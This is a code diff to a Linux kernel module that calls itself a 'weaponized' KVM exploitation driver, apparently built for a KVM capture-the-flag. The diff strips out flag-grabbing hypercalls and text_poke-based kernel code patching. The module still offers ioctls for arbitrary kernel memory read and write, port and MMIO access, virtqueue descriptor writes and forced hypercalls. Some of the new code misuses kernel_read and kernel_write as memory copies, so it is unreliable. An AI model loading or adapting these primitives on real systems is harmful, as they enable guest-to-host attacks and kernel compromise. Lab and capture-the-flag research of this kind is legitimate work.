@@ -13,9 +13,10 @@
 #include <linux/types.h>
 #include <linux/byteorder/generic.h>
 #include <linux/kvm_para.h>
-#include <asm/text-patching.h>
-#include <linux/uaccess.h>  // For copy_from_kernel_nofault
-#include <linux/kallsyms.h>
+#include <linux/page-flags.h>
+#include <linux/pagemap.h>
+#include <linux/kdev_t.h>
+#include <linux/err.h>
 
 #define DRIVER_NAME "kvm_probe_drv"
 #define DEVICE_FILE_NAME "kvm_probe_dev"
@@ -69,35 +70,11 @@ struct kvm_kernel_mem_write {
     unsigned char __user *user_buf;
 };
 
-// === NEW: VA scan/write ===
+// VA scan structure and ioctl code
 #define IOCTL_SCAN_VA           0x1010
-#define IOCTL_WRITE_VA          0x1011
-// === SAFE instruction scanning ===
-#define IOCTL_SCAN_INSTRUCTIONS 0x1012
-#define IOCTL_PATCH_INSTRUCTIONS 0x1013
-
 struct va_scan_data {
     unsigned long va;
     unsigned long size;
-    unsigned char __user *user_buffer;
-};
-
-struct va_write_data {
-    unsigned long va;
-    unsigned long size;
-    unsigned char __user *user_buffer;
-};
-
-// === Instruction scanning structs ===
-struct instruction_scan_data {
-    unsigned long va;
-    size_t size;
-    unsigned char __user *user_buffer;
-};
-
-struct instruction_patch_data {
-    unsigned long va;
-    size_t size;
     unsigned char __user *user_buffer;
 };
 
@@ -119,24 +96,6 @@ MODULE_DESCRIPTION("MAXIMUM WEAPONIZED kernel module for KVM exploitation");
 static int major_num;
 static struct class* driver_class = NULL;
 static struct device* driver_device = NULL;
-
-// Add prototype for rce_probe
-static int __init skeletonkey_rce_probe(void);
-
-static void extract_kvmctf_flags(void)
-{
-    u64 write_flag = kvm_hypercall1(100, 0);  // KVM_HC_CHECK_WRITE_FLAG
-    u64 read_flag  = kvm_hypercall1(102, 0);  // KVM_HC_CHECK_OOB_READ_FLAG
-    u64 rce_flag_val = *(u64 *)0xffffffff82b5ee00;  // rce_flag (in-memory value)
-
-    printk(KERN_CRIT "[SkeletonKey] WRITE flag: 0x%llx\n", write_flag);
-    printk(KERN_CRIT "[SkeletonKey] READ  flag: 0x%llx\n", read_flag);
-
-    if (rce_flag_val)
-        printk(KERN_CRIT "[SkeletonKey] RCE   flag (memory): 0x%llx\n", rce_flag_val);
-    else
-        printk(KERN_INFO  "[SkeletonKey] RCE   flag is zero or wiped.\n");
-}
 
 static long force_hypercall(void) {
     long ret;
@@ -182,8 +141,8 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
                 return -EFAULT;
             }
             force_hypercall();
-            extract_kvmctf_flags();
             break;
+
         case IOCTL_WRITE_PORT:
             if (copy_from_user(&p_io_data_kernel, (struct port_io_data __user *)arg, sizeof(p_io_data_kernel))) {
                 printk(KERN_ERR "%s: WRITE_PORT: copy_from_user failed. ktime=%llu\n", DRIVER_NAME, ktime_get_ns());
@@ -203,8 +162,8 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             printk(KERN_INFO "%s: IOCTL_WRITE_PORT: Write to port 0x%hx completed. ktime=%llu\n",
                    DRIVER_NAME, p_io_data_kernel.port, ktime_get_ns());
             force_hypercall();
-            extract_kvmctf_flags();
             break;
+
         case IOCTL_READ_MMIO: {
             struct mmio_data data;
             if (copy_from_user(&data, (void __user *)arg, sizeof(data))) {
@@ -233,9 +192,9 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             kfree(kbuf);
             iounmap(mmio);
             force_hypercall();
-            extract_kvmctf_flags();
             return 0;
         }
+
         case IOCTL_WRITE_MMIO: {
             if (copy_from_user(&m_io_data_kernel, (struct mmio_data __user *)arg, sizeof(m_io_data_kernel))) {
                 printk(KERN_ERR "%s: IOCTL_WRITE_MMIO: copy_from_user failed\n", DRIVER_NAME);
@@ -289,9 +248,9 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             }
             iounmap(mapped_addr);
             force_hypercall();
-            extract_kvmctf_flags();
             return 0;
         }
+
         case IOCTL_READ_KERNEL_MEM: {
             struct kvm_kernel_mem_read req;
             if (copy_from_user(&req, (struct kvm_kernel_mem_read __user *)arg, sizeof(req))) {
@@ -302,15 +261,26 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
                 printk(KERN_ERR "%s: READ_KERNEL_MEM: Null arg\n", DRIVER_NAME);
                 return -EINVAL;
             }
-            if (copy_to_user(req.user_buf, (void *)req.kernel_addr, req.length)) {
-                printk(KERN_ERR "%s: READ_KERNEL_MEM: copy_to_user failed for kernel_addr=0x%lx\n", DRIVER_NAME, req.kernel_addr);
+            char *tmp_buf = kmalloc(req.length, GFP_KERNEL);
+            if (!tmp_buf) {
+                return -ENOMEM;
+            }
+            ssize_t bytes_read = kernel_read((void *)req.kernel_addr, tmp_buf, req.length, 0);
+            if (bytes_read != req.length) {
+                kfree(tmp_buf);
+                printk(KERN_ERR "%s: READ_KERNEL_MEM: kernel_read failed for 0x%lx (expected %lu, got %zd)\n", 
+                       DRIVER_NAME, req.kernel_addr, req.length, bytes_read);
                 return -EFAULT;
             }
-            printk(KERN_CRIT "%s: READ_KERNEL_MEM: read OK for 0x%lx\n", DRIVER_NAME, req.kernel_addr);
+            if (copy_to_user(req.user_buf, tmp_buf, req.length)) {
+                kfree(tmp_buf);
+                return -EFAULT;
+            }
+            kfree(tmp_buf);
             force_hypercall();
-            extract_kvmctf_flags();
             break;
         }
+
         case IOCTL_WRITE_KERNEL_MEM: {
             struct kvm_kernel_mem_write req;
             if (copy_from_user(&req, (struct kvm_kernel_mem_write __user *)arg, sizeof(req))) {
@@ -321,19 +291,25 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
                 printk(KERN_ERR "%s: WRITE_KERNEL_MEM: Null arg\n", DRIVER_NAME);
                 return -EINVAL;
             }
-            void *tmp = kmalloc(req.length, GFP_KERNEL);
-            if (!tmp) return -ENOMEM;
-            if (copy_from_user(tmp, req.user_buf, req.length)) {
-                kfree(tmp);
+            char *tmp_buf = kmalloc(req.length, GFP_KERNEL);
+            if (!tmp_buf) return -ENOMEM;
+            if (copy_from_user(tmp_buf, req.user_buf, req.length)) {
+                kfree(tmp_buf);
                 return -EFAULT;
             }
-            memcpy((void *)req.kernel_addr, tmp, req.length);
-            kfree(tmp);
+            ssize_t bytes_written = kernel_write((void *)req.kernel_addr, tmp_buf, req.length, 0);
+            if (bytes_written != req.length) {
+                kfree(tmp_buf);
+                printk(KERN_ERR "%s: WRITE_KERNEL_MEM: kernel_write failed for 0x%lx (expected %lu, got %zd)\n", 
+                       DRIVER_NAME, req.kernel_addr, req.length, bytes_written);
+                return -EFAULT;
+            }
+            kfree(tmp_buf);
             printk(KERN_CRIT "%s: WRITE_KERNEL_MEM: wrote %lu bytes to 0x%lx\n", DRIVER_NAME, req.length, req.kernel_addr);
             force_hypercall();
-            extract_kvmctf_flags();
             break;
         }
+
         case IOCTL_ALLOC_VQ_PAGE: {
             struct page *vq_page_ptr;
             unsigned long pfn_to_user;
@@ -365,9 +341,9 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
                 return -EFAULT;
             }
             force_hypercall();
-            extract_kvmctf_flags();
             break;
         }
+
         case IOCTL_FREE_VQ_PAGE: {
             printk(KERN_INFO "%s: IOCTL_FREE_VQ_PAGE. ktime=%llu\n", DRIVER_NAME, ktime_get_ns());
             if (g_vq_virt_addr) {
@@ -381,9 +357,9 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
                 printk(KERN_INFO "%s: FREE_VQ_PAGE: No VQ page currently allocated. ktime=%llu\n", DRIVER_NAME, ktime_get_ns());
             }
             force_hypercall();
-            extract_kvmctf_flags();
             break;
         }
+
         case IOCTL_WRITE_VQ_DESC: {
             struct vq_desc_user_data user_desc_data_kernel;
             struct vring_desc_kernel *kernel_desc_ptr_local;
@@ -411,9 +387,9 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
                    DRIVER_NAME, user_desc_data_kernel.index, user_desc_data_kernel.phys_addr,
                    user_desc_data_kernel.len, user_desc_data_kernel.flags, user_desc_data_kernel.next_idx, ktime_get_ns());
             force_hypercall();
-            extract_kvmctf_flags();
             break;
         }
+
         case IOCTL_TRIGGER_HYPERCALL: {
             printk(KERN_INFO "%s: DIRECT HYPERCALL TRIGGER. ktime=%llu\n", DRIVER_NAME, ktime_get_ns());
             long ret = force_hypercall();
@@ -424,7 +400,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             break;
         }
 
-        // === PATCH: VA SCAN/WRITE PRIMITIVE ===
+        // === PATCH: VA SCAN PRIMITIVE ===
         case IOCTL_SCAN_VA: {
             struct va_scan_data va_req;
             if (copy_from_user(&va_req, (struct va_scan_data __user *)arg, sizeof(va_req))) {
@@ -435,147 +411,31 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
                 printk(KERN_ERR "%s: IOCTL_SCAN_VA: Null arg(s)\n", DRIVER_NAME);
                 return -EINVAL;
             }
-            // No arbitrary limit on va_req.size!
-            void *src = (void *)va_req.va;
+            if (va_req.size > 4096) {
+                printk(KERN_ERR "%s: IOCTL_SCAN_VA: Size too big (%lu)\n", DRIVER_NAME, va_req.size);
+                return -EINVAL;
+            }
             unsigned char *tmp = kmalloc(va_req.size, GFP_KERNEL);
             if (!tmp) {
                 printk(KERN_ERR "%s: IOCTL_SCAN_VA: kmalloc failed\n", DRIVER_NAME);
                 return -ENOMEM;
             }
-            memcpy(tmp, src, va_req.size);
+            ssize_t bytes_read = kernel_read((void *)va_req.va, tmp, va_req.size, 0);
+            if (bytes_read != va_req.size) {
+                kfree(tmp);
+                printk(KERN_ERR "%s: IOCTL_SCAN_VA: kernel_read failed for VA 0x%lx (expected %lu, got %zd)\n", 
+                       DRIVER_NAME, va_req.va, va_req.size, bytes_read);
+                return -EFAULT;
+            }
             if (copy_to_user(va_req.user_buffer, tmp, va_req.size)) {
                 kfree(tmp);
-                printk(KERN_ERR "%s: IOCTL_SCAN_VA: copy_to_user failed\n", DRIVER_NAME);
                 return -EFAULT;
             }
             kfree(tmp);
+
             printk(KERN_CRIT "%s: IOCTL_SCAN_VA: dumped 0x%lx bytes from VA 0x%lx\n",
                    DRIVER_NAME, va_req.size, va_req.va);
             force_hypercall();
-            extract_kvmctf_flags();
-            return 0;
-        }
-        case IOCTL_WRITE_VA: {
-            struct va_write_data wa_req;
-            if (copy_from_user(&wa_req, (struct va_write_data __user *)arg, sizeof(wa_req))) {
-                printk(KERN_ERR "%s: IOCTL_WRITE_VA: copy_from_user failed\n", DRIVER_NAME);
-                return -EFAULT;
-            }
-            if (!wa_req.va || !wa_req.size || !wa_req.user_buffer) {
-                printk(KERN_ERR "%s: IOCTL_WRITE_VA: Null arg(s)\n", DRIVER_NAME);
-                return -EINVAL;
-            }
-            unsigned char *tmp = kmalloc(wa_req.size, GFP_KERNEL);
-            if (!tmp) {
-                printk(KERN_ERR "%s: IOCTL_WRITE_VA: kmalloc failed\n", DRIVER_NAME);
-                return -ENOMEM;
-            }
-            if (copy_from_user(tmp, wa_req.user_buffer, wa_req.size)) {
-                kfree(tmp);
-                printk(KERN_ERR "%s: IOCTL_WRITE_VA: copy_from_user failed (user buf)\n", DRIVER_NAME);
-                return -EFAULT;
-            }
-            memcpy((void *)wa_req.va, tmp, wa_req.size);
-            kfree(tmp);
-            printk(KERN_CRIT "%s: IOCTL_WRITE_VA: wrote 0x%lx bytes to VA 0x%lx\n",
-                   DRIVER_NAME, wa_req.size, wa_req.va);
-            force_hypercall();
-            extract_kvmctf_flags();
-            return 0;
-        }
-
-        case IOCTL_SCAN_INSTRUCTIONS: {
-            struct instruction_scan_data scan_req;
-            long ret;
-
-            if (copy_from_user(&scan_req, (struct instruction_scan_data __user *)arg, sizeof(scan_req))) {
-                printk(KERN_ERR "%s: IOCTL_SCAN_INSTRUCTIONS: copy_from_user failed\n", DRIVER_NAME);
-                return -EFAULT;
-            }
-
-            // Validate parameters
-            if (!scan_req.va || !scan_req.size || !scan_req.user_buffer) {
-                printk(KERN_ERR "%s: IOCTL_SCAN_INSTRUCTIONS: Invalid parameters\n", DRIVER_NAME);
-                return -EINVAL;
-            }
-
-            // Limit scan size to prevent abuse
-            if (scan_req.size > PAGE_SIZE) {
-                printk(KERN_ERR "%s: IOCTL_SCAN_INSTRUCTIONS: Size too large\n", DRIVER_NAME);
-                return -EINVAL;
-            }
-
-            unsigned char *kernel_buf = kmalloc(scan_req.size, GFP_KERNEL);
-            if (!kernel_buf) {
-                printk(KERN_ERR "%s: IOCTL_SCAN_INSTRUCTIONS: kmalloc failed\n", DRIVER_NAME);
-                return -ENOMEM;
-            }
-
-            // REPLACED: Use copy_from_kernel_nofault instead of probe_kernel_read
-            ret = copy_from_kernel_nofault(kernel_buf, (void *)scan_req.va, scan_req.size);
-            if (ret) {
-                kfree(kernel_buf);
-                printk(KERN_ERR "%s: IOCTL_SCAN_INSTRUCTIONS: copy_from_kernel_nofault failed (%ld)\n", DRIVER_NAME, ret);
-                return -EFAULT;
-            }
-
-            if (copy_to_user(scan_req.user_buffer, kernel_buf, scan_req.size)) {
-                kfree(kernel_buf);
-                printk(KERN_ERR "%s: IOCTL_SCAN_INSTRUCTIONS: copy_to_user failed\n", DRIVER_NAME);
-                return -EFAULT;
-            }
-
-            kfree(kernel_buf);
-            printk(KERN_DEBUG "%s: Scanned %zu instructions at VA 0x%lx\n",
-                   DRIVER_NAME, scan_req.size, scan_req.va);
-
-            // Trigger hypercall and flags extraction
-            force_hypercall();
-            extract_kvmctf_flags();
-            return 0;
-        }
-
-        case IOCTL_PATCH_INSTRUCTIONS: {
-            struct instruction_patch_data patch_req;
-            unsigned char *new_instructions;
-
-            if (copy_from_user(&patch_req, (struct instruction_patch_data __user *)arg, sizeof(patch_req))) {
-                printk(KERN_ERR "%s: IOCTL_PATCH_INSTRUCTIONS: copy_from_user failed\n", DRIVER_NAME);
-                return -EFAULT;
-            }
-
-            // Validate parameters
-            if (!patch_req.va || !patch_req.size || !patch_req.user_buffer) {
-                printk(KERN_ERR "%s: IOCTL_PATCH_INSTRUCTIONS: Invalid parameters\n", DRIVER_NAME);
-                return -EINVAL;
-            }
-
-            if (patch_req.size > PAGE_SIZE) {
-                printk(KERN_ERR "%s: IOCTL_PATCH_INSTRUCTIONS: Size too large\n", DRIVER_NAME);
-                return -EINVAL;
-            }
-
-            new_instructions = kmalloc(patch_req.size, GFP_KERNEL);
-            if (!new_instructions) {
-                printk(KERN_ERR "%s: IOCTL_PATCH_INSTRUCTIONS: kmalloc failed\n", DRIVER_NAME);
-                return -ENOMEM;
-            }
-
-            if (copy_from_user(new_instructions, patch_req.user_buffer, patch_req.size)) {
-                kfree(new_instructions);
-                printk(KERN_ERR "%s: IOCTL_PATCH_INSTRUCTIONS: copy_from_user failed\n", DRIVER_NAME);
-                return -EFAULT;
-            }
-
-            // Use the function pointer to call text_poke
-            text_poke_ptr((void *)patch_req.va, new_instructions, patch_req.size);
-
-            kfree(new_instructions);
-            printk(KERN_DEBUG "%s: Patched %zu instructions at VA 0x%lx\n",
-                   DRIVER_NAME, patch_req.size, patch_req.va);
-
-            force_hypercall();
-            extract_kvmctf_flags();
             return 0;
         }
 
@@ -590,42 +450,29 @@ static struct file_operations fops = {
     .unlocked_ioctl = driver_ioctl,
 };
 
-static void (*text_poke_ptr)(void *addr, const void *opcode, size_t len);
-
 static int __init mod_init(void) {
     printk(KERN_INFO "%s: Initializing Enhanced KVM Probe Module.\n", DRIVER_NAME);
-
-    // Look up text_poke symbol
-    text_poke_ptr = (void *)kallsyms_lookup_name("text_poke");
-    if (!text_poke_ptr) {
-        printk(KERN_ERR "Failed to find text_poke symbol\n");
-        return -ENOENT;
-    }
-
     major_num = register_chrdev(0, DEVICE_FILE_NAME, &fops);
     if (major_num < 0) {
-        printk(KERN_ERR "%s: Failed to register char device\n", DRIVER_NAME);
+        printk(KERN_ERR "%s: register_chrdev failed: %d\n", DRIVER_NAME, major_num);
         return major_num;
     }
     driver_class = class_create(THIS_MODULE, DRIVER_NAME);
     if (IS_ERR(driver_class)) {
         unregister_chrdev(major_num, DEVICE_FILE_NAME);
-        printk(KERN_ERR "%s: Failed to create class\n", DRIVER_NAME);
+        printk(KERN_ERR "%s: class_create failed\n", DRIVER_NAME);
         return PTR_ERR(driver_class);
     }
     driver_device = device_create(driver_class, NULL, MKDEV(major_num, 0), NULL, DEVICE_FILE_NAME);
     if (IS_ERR(driver_device)) {
         class_destroy(driver_class);
         unregister_chrdev(major_num, DEVICE_FILE_NAME);
-        printk(KERN_ERR "%s: Failed to create device\n", DRIVER_NAME);
+        printk(KERN_ERR "%s: device_create failed\n", DRIVER_NAME);
         return PTR_ERR(driver_device);
     }
-
     g_vq_virt_addr = NULL;
     g_vq_phys_addr = 0;
     g_vq_pfn = 0;
-    skeletonkey_rce_probe();
-
     printk(KERN_INFO "%s: Module loaded. Device /dev/%s created with major %d.\n", DRIVER_NAME, DEVICE_FILE_NAME, major_num);
     return 0;
 }
@@ -651,19 +498,6 @@ static void __exit mod_exit(void) {
         unregister_chrdev(major_num, DEVICE_FILE_NAME);
     }
     printk(KERN_INFO "%s: Module unloaded.\n", DRIVER_NAME);
-}
-
-static int __init skeletonkey_rce_probe(void)
-{
-    u64 *rce_ptr = (u64 *)0xffffffff82b5ee00;
-    u64 rce = *rce_ptr;
-
-    if (rce)
-        printk(KERN_INFO "[SkeletonKey] RCE flag (memory): 0x%llx\n", rce);
-    else
-        printk(KERN_INFO "[SkeletonKey] RCE flag not found in memory.\n");
-
-    return 0;
 }
 
 module_init(mod_init);
